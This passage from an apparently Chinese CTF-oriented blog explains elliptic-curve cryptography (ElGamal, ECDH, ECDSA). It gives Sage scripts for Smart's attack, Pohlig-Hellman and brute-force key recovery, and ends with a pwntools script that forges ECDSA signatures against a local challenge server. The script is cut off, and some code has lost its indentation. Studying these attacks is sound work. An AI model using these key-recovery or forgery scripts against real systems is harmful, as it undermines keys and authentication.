$C_2=rG$；</p></li><li><p>B将 $C_1,C_2$ 传给A；</p></li><li><p>A收到信息后，计算 $C_1-kC_2$，结果就应该是点 $M$。</p><p>（$C_1-kC_2=M+rK-krG=M+rkG-krG=M$）</p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Sage</span></span><br><span class="line">a = </span><br><span class="line">b = </span><br><span class="line">p = </span><br><span class="line"></span><br><span class="line"><span class="comment">#EllipticCurve([a1, a2, a3, a4, a6]) -- y^2+(a1)xy+(a3)y=x^3+(a2)x^2+(a4)x+(a6)</span></span><br><span class="line">E = EllipticCurve(GF(p), [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, a, b])</span><br><span class="line"></span><br><span class="line">base = E([, ])</span><br><span class="line">pub = E([, ])</span><br><span class="line"></span><br><span class="line">c1 = E([, ])</span><br><span class="line">c2 = E([, ])</span><br><span class="line"></span><br><span class="line">X = base</span><br><span class="line"></span><br><span class="line"><span class="comment">#Bruteforce secret k</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, n):</span><br><span class="line">    <span class="keyword">if</span> X == pub:</span><br><span class="line">        k = i</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] secret k = &quot;</span>, i)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        X = X + base</span><br><span class="line"></span><br><span class="line">m = c2 - (c1 * k)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] x = &quot;</span>, m[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] y = &quot;</span>, m[<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] x+y = &quot;</span>, m[<span class="number">0</span>] + m[<span class="number">1</span>])</span><br></pre></td></tr></table></figure><p>​    </p></li></ul><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://zhuanlan.zhihu.com/p/36326221">ECC椭圆曲线加密算法：介绍</a></p><p><a href="https://www.cnblogs.com/Kalafinaian/p/7392505.html">ECC椭圆曲线详解(有具体实例)</a></p><p><a href="https://blog.csdn.net/cccchhhh6819/article/details/100660139">有限域椭圆曲线定义与计算方式</a></p><p><a href="https://zhuanlan.zhihu.com/p/42629724">ECC椭圆曲线密码学的原理、公式推导、例子、Python实现和应用</a></p><p>​    </p><h4 id="常见攻击"><a href="#常见攻击" class="headerlink" title="常见攻击"></a>常见攻击</h4><ul><li><h5 id="Smart’s-attack"><a href="#Smart’s-attack" class="headerlink" title="Smart’s attack"></a>Smart’s attack</h5><p><strong>适用情况：$\text{E.order}()=p$。</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">p = </span><br><span class="line">A = </span><br><span class="line">B = </span><br><span class="line">E = EllipticCurve(GF(p),[A,B])</span><br><span class="line">P = E(,)</span><br><span class="line">Q = E(,)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">SmartAttack</span>(<span class="params">P,Q,p</span>):</span></span><br><span class="line">    E = P.curve()</span><br><span class="line">    Eqp = EllipticCurve(Qp(p, <span class="number">2</span>), [ ZZ(t) + randint(<span class="number">0</span>,p)*p <span class="keyword">for</span> t <span class="keyword">in</span> E.a_invariants() ])</span><br><span class="line"></span><br><span class="line">    P_Qps = Eqp.lift_x(ZZ(P.xy()[<span class="number">0</span>]), <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">for</span> P_Qp <span class="keyword">in</span> P_Qps:</span><br><span class="line">        <span class="keyword">if</span> GF(p)(P_Qp.xy()[<span class="number">1</span>]) == P.xy()[<span class="number">1</span>]:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    Q_Qps = Eqp.lift_x(ZZ(Q.xy()[<span class="number">0</span>]), <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">for</span> Q_Qp <span class="keyword">in</span> Q_Qps:</span><br><span class="line">        <span class="keyword">if</span> GF(p)(Q_Qp.xy()[<span class="number">1</span>]) == Q.xy()[<span class="number">1</span>]:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    p_times_P = p*P_Qp</span><br><span class="line">    p_times_Q = p*Q_Qp</span><br><span class="line"></span><br><span class="line">    x_P,y_P = p_times_P.xy()</span><br><span class="line">    x_Q,y_Q = p_times_Q.xy()</span><br><span class="line"></span><br><span class="line">    phi_P = -(x_P/y_P)</span><br><span class="line">    phi_Q = -(x_Q/y_Q)</span><br><span class="line">    k = phi_Q/phi_P</span><br><span class="line">    <span class="keyword">return</span> ZZ(k)</span><br><span class="line"></span><br><span class="line">r = SmartAttack(P, Q, p)</span><br><span class="line"><span class="built_in">print</span>(r)</span><br></pre></td></tr></table></figure></li></ul><p>​    </p><h3 id="ECDLP"><a href="#ECDLP" class="headerlink" title="ECDLP"></a>ECDLP</h3><p>ECDLP即椭圆曲线上的离散对数问题（The Elliptic Curve Discrete Logarithm Problem）。</p><p>椭圆曲线上离散对数问题ECDLP定义如下：给定素数 $p$ 和椭圆曲线 $E$，对 $Q=kP$，在已知 $P,Q$ 的情况下求出小于 $p$ 的正整数 $k$。可以证明由 $k$ 和 $P$ 计算 $Q$ 比较容易，而由 $Q$ 和 $P$ 计算 $k$ 则比较困难。</p><p>将椭圆曲线中的加法运算与离散对数中的模乘运算相对应，将椭圆曲线中的乘法运算与离散对数中的模幂运算相对应，我们就可以建立基于椭圆曲线的对应的密码体制。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Sage Code 1</span></span><br><span class="line">p = </span><br><span class="line">a = </span><br><span class="line">b = </span><br><span class="line">E = EllipticCurve(GF(p),[a,b])</span><br><span class="line">P = E(, ) </span><br><span class="line">Q = E(, ) </span><br><span class="line">k = discrete_log(Q, P, operation=<span class="string">&#x27;+&#x27;</span>) </span><br><span class="line"><span class="built_in">print</span>(k)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Sage Code 2</span></span><br><span class="line">p = </span><br><span class="line">a = </span><br><span class="line">b = </span><br><span class="line">E = EllipticCurve(GF(p),[a,b])</span><br><span class="line">P = E(, ) </span><br><span class="line">Q = E(, ) </span><br><span class="line">k = P.discrete_log(Q)</span><br><span class="line"><span class="built_in">print</span>(k)</span><br></pre></td></tr></table></figure><ul><li><h4 id="Pohlig-Hellman算法"><a href="#Pohlig-Hellman算法" class="headerlink" title="Pohlig-Hellman算法"></a>Pohlig-Hellman算法</h4><p>算法由Pohlig和Hellman发明，这是一种为解决离散对数问题而提出的攻击方法，早在1978年就被提出。主要思想是对阶数进行分解，比如整数域中 $y = g^x \pmod p$ 里的 $x$ 以及椭圆曲线离散对数问题中 $Gk = Q$ 的 $G$ 的阶 $n$，这样就把对应的离散对数问题转移到了每个因子条件下对应的离散对数，然后可以利用中国剩余定理进行求解。</p><p>假设需要求解的式子为 $Q=lP$，其中 $P$ 为选取的一个基点， $l$ 为选定的随机数，相当于要求解的私钥。</p><p>首先求得 $P$ 的阶 $n$ ，即可使得 $nP$ 不存在的最小正整数，将 $n$ 进行分解，设 $n=p_1^{e_1}p_2^{e_2}\cdots p_r^{e_r}$，</p><p>将因子取出，计算 $l_i \equiv l \pmod {p_i^{e_i}},\quad i \in [1,r]$，即</p><p>$\begin{cases} l \equiv l_1 \pmod {p_1^{e_1}} \newline l \equiv l_2 \pmod {p_2^{e_2}} \newline {\vdots} \newline l \equiv l_r \pmod {p_r^{e_r}} \end{cases}$</p><p>如果得到 $l_i(i \in [1,r])$ 的值就能使用中国剩余定理进行求解得到 $l$，下面求解 $l_i$。</p><p>首先将 $l_i$ 设为 $p_i$ 表示的多项式 $l_i=z_0+z_1p_i+z_2p_i^2+ \cdots +z_{e-1}p_i^{e-1}, \quad z \in [0,p_i-1]$，</p><p>为计算 $z_i$，分别取 $P_0$ 和 $Q_0$，并取值 $P_0=\cfrac{n}{p_i}P,\quad Q_0=\cfrac{n}{p_i}Q$，</p><p>这样有 $p_iP_0=nP$，则可得到 $Q_0=\cfrac{n}{p_i}Q=\cfrac{n}{p_i}(lP)=l(\cfrac{n}{p_i}P)=lP_0$，相当于在原表达式的两边乘上 $\cfrac{n}{p_i}$，</p><p>再转回 $l_i$，先求解 $z_0$：</p><p>$l_iP=Q \\\Rightarrow l_iP_0=Q_0 \\\Rightarrow (z_0+z_1p_i+\cdots+z_{e-1}p_i^{e-1})P_0=Q_0 \\\Rightarrow z_0P_0=Q_0$</p><p>这时便将在 $P$ 域上的离散对数分解到了 $P_0$ 域上，因为 $P_0$ 的阶是 $\cfrac{n}{p_i}$，已经较原本的阶 $n$ 运算的复杂度小了很多，当然，除非 $n$ 本身就是个大素数。</p><p>求得 $z_0$，再代回原式：</p><p>$(z_0+z_1p_i+\cdots+z_{e-1}p_i^{e-1})P_0=Q_0 \\\Rightarrow z_0P_0+(z_1p_i+\cdots+z_{e-1}p_i^{e-1})P_0=Q_0 \\\Rightarrow (z_1p_i+\cdots+z_{e-1}p_i^{e-1})P_0=Q_0-z_0P_0 \\\Rightarrow z_1p_i=Q_0-z_0P_0$</p><p>此时就可以求解 $z_1$，然后依次将 $z_i$ 全部算出来，这样我们就得到了 $l_1$，然后便可以代入前面的等式，将 $l_i$ 都求出后即可利用中国剩余定理求出 $l$。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Sage Code 1</span></span><br><span class="line">factors, exponents = <span class="built_in">zip</span>(*factor(E.order()))</span><br><span class="line">primes = [factors[i] ^ exponents[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(factors))][:-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span> primes</span><br><span class="line">dlogs = []</span><br><span class="line"><span class="keyword">for</span> fac <span class="keyword">in</span> primes:</span><br><span class="line">t = <span class="built_in">int</span>(<span class="built_in">int</span>(P.order()) / <span class="built_in">int</span>(fac))</span><br><span class="line">dlog = discrete_log(t*Q,t*P,operation=<span class="string">&quot;+&quot;</span>)</span><br><span class="line">dlogs += [dlog]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;factor: &quot;</span>+<span class="built_in">str</span>(fac)+<span class="string">&quot;, Discrete Log: &quot;</span>+<span class="built_in">str</span>(dlog)) <span class="comment">#calculates discrete logarithm for each prime order</span></span><br><span class="line"></span><br><span class="line">l = crt(dlogs,primes)</span><br><span class="line"><span class="built_in">print</span>(l)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Sage Code 2</span></span><br><span class="line">p = </span><br><span class="line">a = </span><br><span class="line">b = </span><br><span class="line">gx = </span><br><span class="line">gy = </span><br><span class="line">px = </span><br><span class="line">py = </span><br><span class="line"></span><br><span class="line">E = EllipticCurve(GF(p), [a, b])</span><br><span class="line">G = E(gx, gy)</span><br><span class="line">n = E.order()</span><br><span class="line">QA = E(px, py)</span><br><span class="line"></span><br><span class="line">factors = <span class="built_in">list</span>(factor(n))</span><br><span class="line">m = <span class="number">1</span></span><br><span class="line">moduli = []</span><br><span class="line">remainders = []</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] Running Pohlig Hellman&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(factors)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i, j <span class="keyword">in</span> factors:</span><br><span class="line">    <span class="keyword">if</span> i &gt; <span class="number">10</span>**<span class="number">9</span>:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    mod = i**j</span><br><span class="line">    g2 = G*(n//mod)</span><br><span class="line">    q2 = QA*(n//mod)</span><br><span class="line">    r = discrete_log(q2, g2, operation=<span class="string">&#x27;+&#x27;</span>)</span><br><span class="line">    remainders.append(r)</span><br><span class="line">    moduli.append(mod)</span><br><span class="line">    m *= mod</span><br><span class="line"></span><br><span class="line">r = crt(remainders, moduli)</span><br><span class="line"><span class="built_in">print</span>(r)</span><br></pre></td></tr></table></figure></li></ul><p>​    </p><h3 id="EDCH"><a href="#EDCH" class="headerlink" title="EDCH"></a>EDCH</h3><p>椭圆曲线迪菲-赫尔曼密钥交换（英语：Elliptic Curve Diffie–Hellman key exchange，缩写为ECDH），是一种匿名的密钥合意协议（Key-agreement protocol），这是迪菲-赫尔曼密钥交换的变种，采用椭圆曲线密码学来加强性能与安全性。在这个协定下，双方利用由椭圆曲线密码学建立的公钥与私钥对，在一个不安全的通道中，建立起安全的共有加密资料。</p><p>ECDH一般来说交换的都是私钥，这个密钥一般作为“对称加密”的密钥而被双方在后续数据传输中使用。</p><p>ECDH是建立在这样一个前提之上的，给定椭圆曲线上的一个点 $P$，一个整数 $k$，求 $Q=kP$ 很容易；但是通过$Q,P$ 求解 $k$ 很难。</p><ul><li><h5 id="算法描述"><a href="#算法描述" class="headerlink" title="算法描述"></a>算法描述</h5><ol><li>A和B双方约定使用ECDH秘钥交换算法，这个时候双方也知道了ECDH算法里的一个大素数 $p$，这个 $p$ 可以看做是一个算法中的常量，$p$ 的位数决定了攻击者破解的难度。还有一个整数 $g$ 用来辅助整个秘钥交换，$g$ 不用很大，双方知道 $g$ 和 $p$ 之后就开始了ECDH交换秘钥的过程。</li><li>A知道了共用参数 $p$ 和 $g$，生成整数 $a$ 作为私钥，A利用 $p,g,a$ 通过公式 $g^a \bmod p = A$ 生成 $A$ 作为公钥传递。</li><li>B通过链路收到A发来的 $p,g,A$，知道了A的公钥 $A$。这个时候B也生成自己的私钥 $b$，然后通过公式 $g^b \bmod p = B$ 生成自己公钥 $B$。 在发送公钥 $B$ 前，B通过 $A^b \bmod p = K$ 生成 $K$ 作为公共密钥，但是并不发送给A。</li><li>A收到B发来的公钥 $B$ 以后，同样通过 $B^a \bmod p = K$ 生成公共密钥 $K$，这样A和B就通过不传递私钥 $a$ 和 $b$ 完成了对公共密钥 $K$ 的协商。</li></ol><p>中间人只知道 $A$ 和 $B$ 以及椭圆曲线的公共参数，是无法算出共享密钥 $K$ 的。</p><p>这其实就是迪菲-赫尔曼问题：给定三个点 $P,aP,bP$，那么 $abP$ 的结果是什么？</p><p>或者可以这么理解：给定三个整数 $k,k^x,k^y$，那么 $k^{xy}$ 的结果是什么？</p></li><li><h5 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h5><p><a href="https://zhuanlan.zhihu.com/p/69042756">ECDH秘钥协商算法原理</a></p><p><a href="https://zhuanlan.zhihu.com/p/66794410">ECC椭圆曲线加密算法：ECDH 和 ECDSA</a></p></li><li><p><strong>攻击</strong></p><ul><li><p>中间人攻击（MITM）</p><ul><li><p>异或</p><p><a href="https://buttondown.email/cryptography-dispatches/archive/cryptography-dispatches-the-most-backdoor-looking/">Cryptography Dispatches: The Most Backdoor-Looking Bug I’ve Ever Seen</a></p><p><a href="https://sectt.github.io/writeups/UnionCTF21/crypto_human_server/README">Human-server - Union CTF 2021</a></p></li></ul></li></ul></li></ul><p>​    </p><h3 id="ECElGamal"><a href="#ECElGamal" class="headerlink" title="ECElGamal"></a>ECElGamal</h3><p>在密码学中，ElGamal加密算法是一个基于迪菲-赫尔曼密钥交换的非对称加密算法。GnuPG和PGP等很多密码学系统中都应用到了ElGamal算法。</p><p>ElGamal加密算法可以定义在任何循环群 $G$ 上。它的安全性取决于 $G$ 上的离散对数难题。</p><ul><li><h5 id="密钥生成"><a href="#密钥生成" class="headerlink" title="密钥生成"></a>密钥生成</h5><p>选取一条椭圆曲线 $\text{E}_p(a,b)$，将明文消息 $m$ 嵌入到曲线上的点 $P_m$，再对点 $P_m$ 做加密变换。</p><p>取 $\text{E}_p(a,b)$ 的一个生成元（基点） $G$， $\text{E}_p(a,b)$ 和 $G$ 作为公开参数。</p><p>A选 $n_A$ 作为密钥，以 $P_A=n_AG$ 作为公钥。</p></li><li><h5 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a>加密过程</h5><p>用户B向A发送消息 $P_m$，选取一个随机的正整数 $k$，产生以下点对作为密文：</p><p>$C_m=(kG,P_m+kP_A)$。</p></li><li><h5 id="解密过程"><a href="#解密过程" class="headerlink" title="解密过程"></a>解密过程</h5><p>A以密文点对中的第二个点，减去用自己的密钥与第一个点的倍乘，即：</p><p>$P_m+kP_A-n_AkG=P_m+k(n_AG)-n_AkG=P_m$。</p></li></ul><p>​    </p><h3 id="ECDSA"><a href="#ECDSA" class="headerlink" title="ECDSA"></a>ECDSA</h3><p>椭圆曲线数字签名算法（英语：Elliptic Curve Digital Signature Algorithm，缩写：ECDSA）是一种基于椭圆曲线密码学的公开密钥加密算法。</p><p>ECDSA是DSA作用于椭圆曲线的一个变种算法。A和B仍然使用同样的曲线，ECDSA需要使用明文的哈希结果，而不是明文本身。哈希函数的选择取决于使用者，但是需要明确的是必须选择加密安全的哈希函数。</p><p><strong>场景</strong>：<strong>Alice 想要使用她的私钥 $d_A$ 来签名，Bob 想用 Alice 的公钥 $H_A$ 要验证签名</strong>（$H_A=d_AG$），只有 Alice 才能提供正确的签名，而每个人都可以验证签名。</p><ul><li><h5 id="签名过程"><a href="#签名过程" class="headerlink" title="签名过程"></a>签名过程</h5><p>A使用算法来签名的步骤：</p><ol><li>选取一条椭圆曲线 $\text{E}_p(a,b)$；</li><li>选取一个随机数 $k\quad (k\in[1,n-1])$，$n$ 为 $\text{E}_p(a,b)$ 的阶；</li><li>选取 $\text{E}_p(a,b)$ 的一个基点 $G$，计算点 $K=kG$，坐标表示为 $K=(x_K,y_K)$；</li><li>计算数字 $r=x_K \bmod n$；</li><li>如果 $r=0$，另选一个 $k$ 并重新计算；</li><li>获取数据 $M$ 的Hash值，记为$z=\text{Hash}(M)$，计算 $s=k^{-1}(z+rd_A) \bmod n$；</li><li>如果 $s=0$，另选一个 $k$ 并重新计算；</li><li>输出签名 $(r,s)$。</li></ol><p>通俗的说，这个算法一开始生成了 $k$，得益于点乘，$k$ 被隐藏在了 $r$ 中，然后通过 $s$ 的等式将 $r$ 绑定到了消息散列值 $z$ 上。</p><p>为了计算 $s$，必须计算 $k^{-1} \bmod n$，只有在 $n$ 是素数的情况下才能保证这一过程，如果子群的阶不是一个素数，ECDSA 将不起作用。</p></li><li><h5 id="验证过程"><a href="#验证过程" class="headerlink" title="验证过程"></a>验证过程</h5><p>为了验证签名，需要A的公钥 $H_A$、哈希值 $z$ 和签名 $(r,s)$。</p><ol><li>计算整数 $u_1=s^{-1}z \bmod n$；</li><li>计算整数 $u_2=s^{-1}r \bmod n$；</li><li>计算点 $P=u_1G+u_2H_A=(s^{-1}zG+s^{-1}rH_A) \bmod n=s^{-1}G(z+rd_A) \bmod n$；</li><li>只有当 $r=x_P \bmod n$ 的时候，签名才被成功验证。</li></ol></li><li><h5 id="参考-2"><a href="#参考-2" class="headerlink" title="参考"></a>参考</h5><p><a href="https://zhuanlan.zhihu.com/p/31671646">ECDSA数字签名算法</a></p><p><a href="https://zhuanlan.zhihu.com/p/66794410">ECC椭圆曲线加密算法：ECDH 和 ECDSA</a></p></li><li><h5 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h5><ul><li><p>$k$ 复用（共享 $k$）</p><p><a href="https://blog.trailofbits.com/2020/06/11/ecdsa-handle-with-care/">ECDSA: Handle with Care</a></p><p>参考DSA攻击。</p></li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256, sha1</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> parse <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> bruteforce</span><br><span class="line"><span class="keyword">import</span> string, random</span><br><span class="line"><span class="keyword">import</span> ecdsa</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">PORT = <span class="number">10305</span></span><br><span class="line"></span><br><span class="line">r = remote(HOST, PORT)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">brute_force</span>(<span class="params">prefix,s</span>):</span></span><br><span class="line"><span class="keyword">return</span> bruteforce(<span class="keyword">lambda</span> x:sha256(x+prefix).hexdigest()==s,string.ascii_letters+string.digits,length=<span class="number">4</span>,method=<span class="string">&#x27;fixed&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recv</span>(<span class="params">keepends=<span class="literal">False</span></span>):</span></span><br><span class="line"><span class="keyword">return</span> r.recvline(keepends=keepends).strip()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send</span>(<span class="params">anti, msg</span>):</span></span><br><span class="line">r.sendlineafter(anti, msg)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendHash</span>():</span></span><br><span class="line">context = recv()</span><br><span class="line">prefix, s = parse(<span class="string">&quot;sha256(XXXX+&#123;&#125;) == &#123;&#125;&quot;</span>,context)</span><br><span class="line">proof = brute_force(prefix,s)</span><br><span class="line">send(<span class="string">&quot;Give me XXXX:&quot;</span>, proof)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getMessage</span>():</span></span><br><span class="line">recv()</span><br><span class="line">recv()</span><br><span class="line">msg1 = recv()[-<span class="number">64</span>:]</span><br><span class="line">msg2 = recv()[-<span class="number">64</span>:]</span><br><span class="line"><span class="keyword">return</span> msg1, msg2</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calculator</span>(<span class="params">msg1, msg2</span>):</span></span><br><span class="line">curve = ecdsa.curves.SECP256k1</span><br><span class="line">G = curve.generator</span><br><span class="line">n = G.order()</span><br><span class="line"></span><br><span class="line">r = <span class="number">0</span> </span><br><span class="line"><span class="keyword">while</span> r == <span class="number">0</span>:</span><br><span class="line">random_k = ecdsa.util.randrange(n)</span><br><span class="line">k = random_k % n</span><br><span class="line">ks = k + n</span><br><span class="line">kt = ks + n</span><br><span class="line"><span class="keyword">if</span> ecdsa.util.bit_length(ks) == ecdsa.util.bit_length(n):</span><br><span class="line">p1 = kt * G</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p1 = ks * G</span><br><span class="line">r = p1.x() % n</span><br><span class="line"></span><br><span class="line">h1 = ecdsa.util.string_to_number(sha1(msg1).digest()) % n</span><br><span class="line">h2 = ecdsa.util.string_to_number(sha1(msg2).digest()) % n</span><br><span class="line"></span><br><span class="line">x = ((-(h1 + h2)) * invert(<span class="number">2</span>*r, n)) % n</span><br><span class="line">prikey = ecdsa.SigningKey.from_secret_exponent(x, ecdsa.curves.SECP256k1, hashfunc=sha1)</span><br><span class="line">pubkey = prikey.get_verifying_key()</span><br><span class="line"></span><br><span class="line">send(<span class="string">&quot;Please choice your options:&quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">send(<span class="string">&quot;Please give me your public_key(hex):&quot;</span>, pubkey.to_string().encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line"></span><br><span class="line">sign = prikey.sign(msg1, k = k)</span><br><span class="line"></span><br><span class="line">send(<span class="string">&quot;Please choice your options:&quot;</span>, <span class="string">&quot;5&quot;</span>)</span><br><span class="line">send(<span class="string">&quot;Please give me the message(hex):&quot;</span>, msg1.encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">send(<span class="string">&quot;Please give me the signature(hex):&quot;</span>, sign.encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;Verify successfully!&quot;</span> <span class="keyword">in</span> recv():</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;msg1 verify successfully!&quot;</span>)</span><br><span class="line"></span><br><span class="line">send(<span class="string">&quot;Please choice your options:&quot;</span>, <span class="string">&quot;5&quot;</span>)</span><br><span class="line">send(<span class="string">&quot;Please give me the message(hex):&quot;</span>, msg2.encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">send(<span class="string">&quot;Please give me the signature(hex):&quot;</span>, sign.encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;Verify 